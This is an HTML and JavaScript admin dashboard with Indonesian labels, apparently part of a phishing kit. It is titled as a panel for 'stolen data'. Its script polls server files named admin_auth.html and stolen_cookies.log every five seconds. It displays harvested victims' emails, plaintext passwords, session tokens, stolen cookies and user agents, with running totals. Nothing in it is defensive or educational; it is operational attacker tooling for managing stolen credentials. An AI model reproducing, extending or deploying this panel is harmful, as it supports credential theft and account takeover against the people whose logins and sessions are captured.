<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Admin Panel - Data Curian</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: #0a0e14;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: #c9d1d9;
      padding: 20px;
    }
    h1 {
      color: #58a6ff;
      border-bottom: 2px solid #30363d;
      padding-bottom: 15px;
      margin-bottom: 30px;
      font-weight: 400;
      letter-spacing: 1px;
    }
    h1 span {
      background: #238636;
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 14px;
      color: white;
      margin-left: 15px;
    }
    .stats {
      display: flex;
      gap: 20px;
      margin-bottom: 30px;
      flex-wrap: wrap;
    }
    .stats .card {
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 10px;
      padding: 18px 25px;
      flex: 1;
      min-width: 150px;
    }
    .stats .card .label {
      font-size: 13px;
      color: #8b949e;
    }
    .stats .card .value {
      font-size: 28px;
      font-weight: bold;
      color: #f0f6fc;
      margin-top: 5px;
    }
    .stats .card .value.green { color: #3fb950; }
    .stats .card .value.red { color: #f85149; }
    .container {
      display: flex;
      gap: 30px;
      flex-wrap: wrap;
    }
    .box {
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 12px;
      padding: 20px;
      flex: 1;
      min-width: 300px;
    }
    .box h2 {
      font-size: 18px;
      font-weight: 400;
      color: #58a6ff;
      margin-bottom: 15px;
      border-bottom: 1px solid #30363d;
      padding-bottom: 10px;
    }
    .entry {
      background: #0d1117;
      border-left: 3px solid #238636;
      padding: 12px 15px;
      margin-bottom: 12px;
      border-radius: 6px;
      font-size: 13px;
      word-break: break-all;
    }
    .entry .email { color: #58a6ff; font-weight: bold; }
    .entry .pass { color: #f0883e; }
    .entry .token { color: #8b949e; font-size: 11px; }
    .entry .time { color: #8b949e; font-size: 11px; float: right; }
    .cookie-entry {
      background: #0d1117;
      border-left: 3px solid #f0883e;
      padding: 12px 15px;
      margin-bottom: 12px;
      border-radius: 6px;
      font-size: 13px;
    }
    .cookie-entry .cookies {
      color: #f0f6fc;
      font-size: 12px;
      word-break: break-all;
    }
    .empty {
      color: #8b949e;
      font-style: italic;
      text-align: center;
      padding: 30px 0;
    }
    .badge {
      background: #238636;
      color: white;
      font-size: 11px;
      padding: 2px 10px;
      border-radius: 12px;
      margin-left: 8px;
    }
    .badge.cookie-badge { background: #d29922; }
  </style>
</head>
<body>

  <h1>🕵️ Admin Panel <span>Live</span></h1>

  <!-- Statistik -->
  <div class="stats">
    <div class="card">
      <div class="label">Total Login Berhasil</div>
      <div class="value green" id="totalSuccess">0</div>
    </div>
    <div class="card">
      <div class="label">Total Cookie Curian</div>
      <div class="value" id="totalCookies" style="color:#d29922;">0</div>
    </div>
    <div class="card">
      <div class="label">Terakhir Update</div>
      <div class="value" style="font-size:16px; font-weight:400;" id="lastUpdate">-</div>
    </div>
  </div>

  <!-- Data -->
  <div class="container">
    <!-- Credential Logs -->
    <div class="box">
      <h2>🔑 Credential Tercatat</h2>
      <div id="credentialList">
        <div class="empty">Belum ada data login...</div>
      </div>
    </div>

    <!-- Cookie Logs -->
    <div class="box">
      <h2>🍪 Cookie Curian</h2>
      <div id="cookieList">
        <div class="empty">Belum ada cookie curian...</div>
      </div>
    </div>
  </div>

  <script>
    // ===== AMBIL DATA DARI FILE =====
    async function fetchData() {
      try {
        // Ambil data credential dari admin_auth.html (yang di-generate backend)
        const credRes = await fetch('/admin_auth.html');
        const credHtml = await credRes.text();

        // Ambil data cookie dari stolen_cookies.log
        const cookieRes = await fetch('/stolen_cookies.log');
        const cookieText = await cookieRes.text();

        // Parse credential
        const parser = new DOMParser();
        const doc = parser.parseFromString(credHtml, 'text/html');
        const entries = doc.querySelectorAll('#data > div');

        const credList = document.getElementById('credentialList');
        credList.innerHTML = '';

        if (entries.length === 0) {
          credList.innerHTML = '<div class="empty">Belum ada data login...</div>';
        } else {
          let total = 0;
          entries.forEach(div => {
            const html = div.innerHTML;
            const emailMatch = html.match(/Email:<\/strong>\s*(.*?)\s*<br>/);
            const passMatch = html.match(/Password:<\/strong>\s*(.*?)\s*<br>/);
            const tokenMatch = html.match(/Token:<\/strong>\s*(.*?)\s*<br>/);
            const timeMatch = html.match(/Waktu:<\/strong>\s*(.*?)\s*<\/div>/);

            const email = emailMatch ? emailMatch[1] : 'N/A';
            const pass = passMatch ? passMatch[1] : 'N/A';
            const token = tokenMatch ? tokenMatch[1] : 'N/A';
            const time = timeMatch ? timeMatch[1] : 'N/A';

            const entryDiv = document.createElement('div');
            entryDiv.className = 'entry';
            entryDiv.innerHTML = `
              <span class="email">${email}</span>
              <span class="pass"> | ${pass}</span>
              <span class="time">${time}</span>
              <br><span class="token">Token: ${token.substring(0, 30)}...</span>
            `;
            credList.appendChild(entryDiv);
            total++;
          });
          document.getElementById('totalSuccess').textContent = total;
        }

        // Parse cookie logs
        const cookieList = document.getElementById('cookieList');
        cookieList.innerHTML = '';

        if (!cookieText.trim()) {
          cookieList.innerHTML = '<div class="empty">Belum ada cookie curian...</div>';
          document.getElementById('totalCookies').textContent = '0';
        } else {
          const lines = cookieText.trim().split('\n');
          let cookieCount = 0;
          lines.forEach(line => {
            try {
              const data = JSON.parse(line);
              const cookies = data.cookies || {};
              const time = data.time || 'N/A';
              const userAgent = data.userAgent || 'N/A';

              const div = document.createElement('div');
              div.className = 'cookie-entry';
              let cookieStr = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
              div.innerHTML = `
                <div><strong>⏱️ ${time}</strong></div>
                <div class="cookies">🍪 ${cookieStr || 'Tidak ada cookie'}</div>
                <div style="font-size:10px; color:#8b949e; margin-top:4px;">UA: ${userAgent}</div>
              `;
              cookieList.appendChild(div);
              cookieCount++;
            } catch (e) {
              // skip line corrupt
            }
          });
          document.getElementById('totalCookies').textContent = cookieCount;
        }

        document.getElementById('lastUpdate').textContent = new Date().toLocaleString('id-ID');

      } catch (err) {
        console.error('Gagal fetch data:', err);
      }
    }

    // Auto refresh tiap 5 detik
    fetchData();
    setInterval(fetchData, 5000);
  </script>

</body>
</html>
